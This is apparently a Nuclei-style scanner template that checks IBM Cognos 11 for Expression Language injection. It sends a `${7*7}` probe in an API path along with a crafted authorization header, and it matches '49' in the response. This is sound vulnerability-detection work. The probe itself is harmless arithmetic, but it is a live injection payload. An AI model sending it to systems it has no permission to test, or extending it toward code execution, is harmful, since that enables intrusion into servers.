id: cognos-el-injection

info:
  name: EL Injection on Cognos 11
  author: v7nc3nz
  severity: high
  description: |
    This template checks for Expression Language (EL) Injection vulnerability in IBM Cognos 11. The vulnerability can be exploited by injecting EL expressions into the URL, leading to arbitrary code execution on the server.

http:
  - raw:
      - |
        GET /api/v1/roles/${7*7} HTTP/2
        Host: {{Hostname}}
        Ibm-Ba-Authorization: CAM random

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "49"
        part: body